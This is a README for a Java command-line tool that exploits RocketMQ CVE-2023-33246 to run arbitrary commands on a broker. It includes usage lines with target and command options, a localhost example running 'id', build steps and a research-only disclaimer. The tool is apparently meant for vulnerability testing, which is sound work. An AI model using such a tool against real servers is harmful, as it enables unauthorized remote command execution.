# RocketMQ Attack Tool

A command-line tool for testing RocketMQ vulnerabilities.

## Features

- [x] Attack RocketMQ Broker (CVE-2023-33246)
- [ ] Attack RocketMQ Nameserver (CVE-2023-37582)
- [x] Easy-to-use command-line interface
- [x] Support for both short and long command options

## Usage

Download the latest built JAR file from [Releases](https://github.com/vulhub/rocketmq-attack/releases/tag/1.0).

### Attack Broker (CVE-2023-33246)

```bash
java -jar rocketmq-attack-1.0-SNAPSHOT.jar AttackBroker --target <host:port> --cmd <command>

# Example:
java -jar rocketmq-attack-1.0-SNAPSHOT.jar AttackBroker --target 127.0.0.1:10911 --cmd "id"
```

### Attack Nameserver (CVE-2023-37582)

TODO

### Command Options

Both attack modes support the following options:

- `-t, --target`: Target address in host:port format
- `-c, --cmd`: Command to execute on the target
- `--help`: Show help message

## Building

Requires JDK 8 or later.

```bash
./gradlew shadowJar
```

The built JAR file will be located at `build/libs/rocketmq-attack-1.0-SNAPSHOT.jar`

## Disclaimer

**This tool is for security research and testing purposes only. Do not use it against systems you don't own or don't have permission to test.**

## References

- [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)
- [CVE-2023-37582](https://nvd.nist.gov/vuln/detail/CVE-2023-37582)

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
